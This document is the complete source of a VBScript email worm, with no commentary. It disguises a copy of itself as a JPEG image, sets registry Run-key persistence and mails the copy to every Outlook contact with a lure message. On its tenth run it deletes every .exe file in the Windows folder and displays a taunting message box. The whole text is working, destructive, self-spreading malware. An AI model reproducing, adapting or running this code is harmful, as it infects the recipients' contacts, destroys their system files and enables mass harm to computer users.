on error resume next
set fso=createobject("scripting.filesystemobject")
set wscriptshell=createobject("wscript.shell")


set winfolder=fso.getspecialfolder(0)

autostart=winfolder&"\run32dll.vbs"
mailfile=winfolder&"\Monica-Bellucci.jpg.vbs"

fso.copyfile wscript.scriptfullname,autostart

fso.copyfile wscript.scriptfullname,mailfile

wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Microsoft","wscript.exe"&" "&autostart&" "&"%"

if wscriptshell.regread ("HKLM\SOFTWARE\TaskManager") <> "8" then
johana()
end if

if wscriptshell.regread ("HKCU\SOFTWARE\TaskManager")= "" then
wscriptshell.regwrite "HKCU\SOFTWARE\TaskManager","1"
end if

if wscriptshell.regread ("HKCU\SOFTWARE\TaskManager")  <> "10" then
regcounter=wscriptshell.regread ("HKCU\SOFTWARE\TaskManager")
regcounter=regcounter+1
wscriptshell.regwrite "HKCU\SOFTWARE\TaskManager",regcounter
end if

if wscriptshell.regread ("HKCU\SOFTWARE\TaskManager") = "10" then
set files=winfolder.files
for each file in files
if fso.getextensionname(file.path)="exe" then
fso.deletefile file.path,true
end if
next
msgbox "I LoVe JohaNa From PoRtuGal,CherNoByl virus Hit Her But She Still loVes Nelly Fourtado..I salute Her+QPWAEDRETLYI+MIGEL->Spain,Athens",64,"Nik Says HI! ;) to Johana"
end if


function johana()

on error resume next
set out=createobject("Outlook.Application")
if out="Outlook" then
set mapi=out.GetNameSpace("MAPI")
set newitem=mapi.getdefaultfolder(10)
for x=1 to newitem.items.count
set mailitem=out.CreateItem(0)
set email=newitem.items.item(x)
mailitem.To=email
mailitem.Subject="Here you have, ;o)"
mailitem.Body="Hi"&" "&email&".Check This!"
set attachments=mailitem.Attachments
attachments.Add mailfile
mailitem.send
next
wscriptshell.regwrite "HKLM\SOFTWARE\TaskManager","8"
end if

end function



